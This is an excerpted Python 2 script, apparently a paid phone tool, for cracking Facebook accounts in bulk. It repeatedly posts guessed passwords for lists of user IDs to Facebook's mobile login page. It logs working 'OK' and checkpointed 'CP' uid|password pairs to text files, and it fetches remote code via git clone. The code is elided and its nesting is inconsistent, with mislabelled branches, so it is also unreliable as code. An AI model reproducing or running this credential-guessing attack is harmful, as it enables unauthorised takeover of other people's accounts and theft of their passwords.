...
logo = """'
'\x1b[1;91m'
'\x1b[1;91m'   Author      ||    SHAHID     
'\x1b[1;92m'   Github      ||    UNKNOW 
'\x1b[1;93m'   FB ID       || www.facebook.com/03081008587sahil
'\x1b[1;94m'   TOOL TYPE   ||    PAID
'\x1b[1;96m'   WAP NUMBER  ||     03081008587           
'\x1b[1;91m' 
"""
dec="2"
server="2"
...
def main_apv():
    ...
    print logo
    try:
        key1=open("/sdcard/Shahid.txt",'r').read()
    except IOError:
        os.system("clear")
        print logo
    ...
    r1=requests.get("https://raw.githubusercontent.com/Alesi406080/Xnxx/main/server.txt").text
    if key1 in r1:
        main_system()
    else:
        os.system("clear")
...
def main_input():
    ...
    if mx=='1':
        ...
        print ("")
        print ("")
        print ("        Congratulations Bro Your ")
        print ("   Paid Commands ")
        print ("     Update after 30day")
        time.sleep(3.5)
        main_system()
    elif mx=='6':
        os.system("git clone https://github.com/Red-Mafia/Paid-1.git")
        os.system("rm -rf Xnxx")
        os.system("cp -f Xnxx/Xnxx \\.")
        os.system("rm -rf Xnxxx")
        time.sleep(5)
...
def numcloning():
    ...
    print ""
    os.system('echo " ༄Mr𝙧᭄•─────────────────•༄Shahid𝙧᭄"| lolcat')
...
def mineExt():
    ...
    print g+"[=] Extracting From Shahid : "+my_line[:15]
...
'Mozilla/5.0 (Linux; Android 11; Nokia 3.2 Build/RKQ1.200928.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        ...
                        if 'checkpoint' in rana.cookies.get_dict().keys():
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                ...
                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                    print "\x1b[1;91m[riaz-CP] "+uid + " | " + pass3
                                    cp=open('rsa-cp.txt', 'a')
                                    cp.write(uid+ " | " +pass3+ "\n")
                                    cp.close()
                                    ...
                                    if 'c_user' in rana.cookies.get_dict().keys():
                                        ...
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            print "\x1b[1;91m[riaz-CP] "+uid + " | " + pass4
                                            cp=open('rsa-cp.txt', 'a')
                                            cp.write(uid+ " | " +pass4+ "\n")
                                            cp.close()
                                            ...
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                ...
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    print "\x1b[1;91m[riaz-CP] "+uid + " | " + pass5
                                                    cp=open('rsa-cp.txt', 'a')
                                                    cp.write(uid+ " | " +pass5+ "\n")
                                                    cp.close()
    ...
    print "\033[1;93m NAAM TO SONA HOGAA [riaz])"
    print 39*'-'
    print ''
    raw_input(' Press enter to back ')
    fb_menu()
...
'Mozilla/5.0 (Linux; Android 11; Nokia 3.2 Build/RKQ1.200928.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
        try:
            ...
            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass1, 'login': 'submit'})
            if 'c_user' in rana.cookies.get_dict().keys():
                print "\x1b[1;92m[Shahid-OK] "+uid + " | " + pass1
                ok=open('Shahid-ok.txt', 'a')
                ok.write(uid+ " | " +pass1+ "\n")
                ok.close()
                oks.append(uid+pass1)
            else:
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    ...
                    b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass2, 'login': 'submit'})
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print "\x1b[1;92m[Shahid-OK] "+uid + " | " + pass2
                        ok=open('Shahid-ok.txt', 'a')
                        ok.write(uid+ " | " +pass2+ "\n")
                        ok.close()
                        oks.append(uid+pass2)
                        ...
                        if 'checkpoint' in rana.cookies.get_dict().keys():
                            ...
                            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass3, 'login': 'submit'})
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print "\x1b[1;92m[Shahid-OK] "+uid + " | " + pass3
                                ok=open('Shahid-ok.txt', 'a')
                                ok.write(uid+ " | " +pass3+ "\n")
                                ok.close()
                                oks.append(uid+pass3)
                                ...
                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                    ...
                                    b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass4, 'login': 'submit'})
                                    if 'c_user' in rana.cookies.get_dict().keys():
                                        print "\x1b[1;92m[Shahid-OK] "+uid + " | " + pass4
                                        ok=open('Shahid-ok.txt', 'a')
                                        ok.write(uid+ " | " +pass4+ "\n")
                                        ok.close()
                                        oks.append(uid+pass4)
                                        ...
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            ...
                                            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass5, 'login': 'submit'})
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                print "\x1b[1;92m[Shahid-OK] "+uid + " | " + pass5
                                                ok=open('Shahid-ok.txt', 'a')
                                                ok.write(uid+ " | " +pass5+ "\n")
                                                ok.close()
                                                oks.append(uid+pass5)
                                                ...
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    print "\x1b[1;91m[Shahid-CP] "+uid + " | " + pass5
                                                    cp=open('Shahid-cp.txt', 'a')
                                                    cp.write(uid+ " | " +pass5+ "\n")
                                                    cp.close()
                                                    cps.append(uid+pass5)
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                ...
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        ...
                        if 'checkpoint' in rana.cookies.get_dict().keys():
                            print "\x1b[1;91m[Shahid-CP] "+uid + " | " + pass2
                            cp=open('Shahid-cp.txt', 'a')
                            cp.write(uid+ " | " +pass2+ "\n")
                            cp.close()
                            cps.append(uid+pass2)
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                ...
                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                    print "\x1b[1;91m[Shahid-OK] "+uid + " | " + pass3
                                    cp=open('Shahid-cp.txt', 'a')
                                    cp.write(uid+ " | " +pass3+ "\n")
                                    cp.close()
                                    cps.append(uid+pass3)
                                    ...
                                    if 'c_user' in rana.cookies.get_dict().keys():
                                        ...
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            print "\x1b[1;91m[Shahid-CP] "+uid + " | " + pass4
                                            cp=open('Shahid-cp.txt', 'a')
                                            cp.write(uid+ " | " +pass4+ "\n")
                                            cp.close()
                                            cps.append(uid+pass4)
                                            ...
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                ...
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    print "\x1b[1;97m[Shahid-CP] "+uid + " | " + pass5
                                                    cp=open('Shahid-cp.txt', 'a')
                                                    cp.write(uid+ " | " +pass5+ "\n")
                                                    cp.close()
                                                    cps.append(uid+pass5)
...
def xoknp():
    ...
    try:
        ...
        fb_menu()
    print "[!] total ids : "+str(len(idx))
    os.system('echo " ༄Mr𝙧᭄•─────────────────•༄rShahid𝙧᭄"| lolcat')
    print "\033[1;91m    cracking start please wait ..   "
    os.system('echo " ༄Mr𝙧᭄•─────────────────•༄Shahid𝙧᭄"| lolcat')
    def main(arg):
        user=arg
                        ...
                        if 'checkpoint' in rana.cookies.get_dict().keys():
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                ...
                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                    ...
                                    b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass4, 'login': 'submit'})
                                    if 'c_user' in rana.cookies.get_dict().keys():
                                        print "\x1b[1;92mShahid-OK] "+uid + " | " + pass4
                                        ok=open('Shahid-ok.txt', 'a')
                                        ok.write(uid+ " | " +pass4+ "\n")
                                        ok.close()
                                        oks.append(uid+pass4)
        ...
        try:
            ...
            if "access_token" in q:
                ...
                if "www.facebook.com" in q ["error_msg"]:
                    print "\x1b[1;91m[Shahid-OK] "+uid + " | " + pass1
                    cp=open('Shahid-cp.txt', 'a')
                    cp.write(uid+ " | " +pass1+ "\n")
                    cp.close()
                    cps.append(uid+pass1)
                    ...
                    if "access_token" in q:
                        ...
                        if "www.facebook.com" in q ["error_msg"]:
                            ...
                            if "access_token" in q:
                                ...
                                if "www.facebook.com" in q ["error_msg"]:
                                    print "\x1b[1;91m[Shahid-CP] "+uid + " | " + pass3
                                    cp=open('Shahid-cp.txt', 'a')
                                    cp.write(uid+ " | " +pass3+ "\n")
                                    cp.close()
                                    cps.append(uid+pass3)
            ...
            if "access_token" in q:
                ...
                if "www.facebook.com" in q ["error_msg"]:
                    ...
                    if "access_token" in q:
                        ...
                        if "www.facebook.com" in q ["error_msg"]:
                            print "\x1b[1;91m[Shahid-OK] "+uid + " | " + pass2
                            cp=open('Shahid-ok.txt', 'a')
                            cp.write(uid+ " | " +pass2+ "\n")
                            cp.close()
                            cps.append(uid+pass2)
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        ...
                        if 'checkpoint' in rana.cookies.get_dict().keys():
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                ...
                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                    print "\x1b[1;97m[Shahid-CP] "+uid + " | " + pass3
                                    cp=open('Shahid-cp.txt', 'a')
                                    cp.write(uid+ " | " +pass3+ "\n")
                                    cp.close()
                                    cps.append(uid+pass3)
                                    ...
                                    if 'c_user' in rana.cookies.get_dict().keys():
                                        ...
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            ...
                                            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass5, 'login': 'submit'})
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                print "\x1b[1;92m[Sahid-OK] "+uid + " | " + pass5
                                                ok=open('Shahid-ok.txt', 'a')
                                                ok.write(uid+ " | " +pass5+ "\n")
                                                ok.close()
                                                oks.append(uid+pass5)
                                    ...
                                    if 'c_user' in rana.cookies.get_dict().keys():
                                        ...
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            ...
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                ...
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    print "\x1b[1;92m[Shahid-CP] "+uid + " | " + pass5
                                                    cp=open('Shahid-cp.txt', 'a')
                                                    cp.write(uid+ " | " +pass5+ "\n")
                                                    cp.close()
                                                    cps.append(uid+pass5)
                                        ...
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            ...
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                ...
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    ...
                                                    if 'c_user' in rana.cookies.get_dict().keys():
                                                        print "\x1b[1;92m[Shahid-OK] "+uid + " | " + pass6
                                                        ok=open('Shahid-ok.txt', 'a')
                                                        ok.write(uid+ " | " +pass6+ "\n")
                                                        ok.close()
                                                        ...
                                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                                            print "\x1b[1;91m[Shahid-CP] "+uid + " | " + pass6
                                                            cp=open('Shahid-cp.txt', 'a')
                                                            cp.write(uid+ " | " +pass6+ "\n")
                                                            cp.close()
